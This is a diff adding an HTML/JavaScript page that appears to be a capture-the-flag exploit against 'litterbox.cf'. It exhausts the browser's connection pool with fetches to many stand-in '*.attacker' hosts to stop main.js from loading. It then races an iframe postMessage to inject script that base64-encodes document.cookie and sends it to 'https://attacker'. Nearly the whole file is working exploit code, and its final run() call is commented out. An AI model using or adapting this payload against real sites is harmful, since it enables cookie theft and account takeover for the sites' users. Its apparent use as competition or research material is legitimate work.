@@ -1,0 +1,46 @@
+<iframe id=f0></iframe>
+
+<div id='killme'></div>
+
+<script>
+
+const sleep = (ms) => {return new Promise(r => setTimeout(r, ms))}
+
+const solve = async () => {
+    // keep blocking connections
+    fetch(`https://1337.attacker/ssleep`, {mode: 'no-cors'}); 
+    let frame = document.createElement('iframe')
+    killme.appendChild(frame)
+    frame.contentWindow.eval("parent.frames[0].postMessage('console.log(`xss`);document.location=`https://attacker?xxxxxxxx=${btoa(document.cookie)}`','*')");
+    // delete so e.source == null == undefined
+    killme.innerHTML = ''
+}
+
+const run = async() => {
+    
+    // 5 seconds
+    fetch(`https://0.attacker/msleep`, {mode: 'no-cors'});
+    // exaust connection pool to
+    // block main.js from loading
+    // iframe is not loaded
+    for(let i=1;i<256;i++){
+        // 5 seconds
+        fetch(`https://${i}.attacker/msleep`, {mode: 'no-cors'});   
+    }
+    // load frame
+    f0.src=`https://litterbox.cf`
+    // adjust timings if you have a slow pc
+    loop = setInterval(solve, 50)
+
+    // ok this is enough
+    await sleep(5000)
+    clearInterval(loop)
+
+}
+
+// plz dont spam my server
+// run()
+
+
+
+</script>
